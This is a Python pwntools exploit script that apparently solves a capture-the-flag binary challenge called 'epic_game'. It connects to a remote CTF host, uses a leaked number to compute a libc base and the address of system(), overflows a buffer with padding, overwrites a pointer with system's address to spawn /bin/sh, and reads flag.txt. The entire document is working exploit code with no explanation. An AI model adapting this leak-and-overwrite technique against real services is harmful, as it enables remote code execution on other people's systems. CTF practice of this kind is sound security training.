from pwn import *

system = 0

p = remote("epic_game.ichsa.ctf.today", 8007)
#p = process("./app.out")

#    b * 0x0401904

#pid = gdb.attach(p,gdbscript="""
#    b * 004018dd
#    """
#)

def setup(p):
    global system
    p.sendlineafter("Your Choice:\n","1")
    p.sendlineafter("Your Choice:\n","/bin/sh")
    p.recvuntil("Your lucky number is ")
    leak = int(p.recvline(),10)
    print("rand leak: " +hex(leak))
    libc_base = leak - 0x00000000003aef0
    #libc_base = leak - 0x00000000000444c0


    system =  libc_base+0x000000000449c0
    #system =  libc_base+0x000000000004f550
    print("libc_base: "+ hex(libc_base))
    print("system: "+ hex(system))

def overwirite(p):
    payload = "a" * 64
    payload_final = "a" * 63
    for _ in range(15):
        p.sendafter("Your Choice:\n",str(payload))

    p.sendafter("Your Choice:\n",str(payload_final))
    p.sendlineafter("Your Choice:\n",str("3"))
    p.sendlineafter("Your Choice:\n",str("3"))
    p.sendlineafter("Your Choice:\n",str("BBBBBBBB\xff\xff\xff\xff\xff\xff\xff\xff"))
    p.sendlineafter("Your Choice:\n",str("3"))
    p.sendlineafter("Your Choice:\n",str("AAAAA")+p64(system))
    #p.sendlineafter("Your Choice:\n",str("3"))
    p.sendline("cat flag.txt")





setup(p)
overwirite(p)
p.interactive()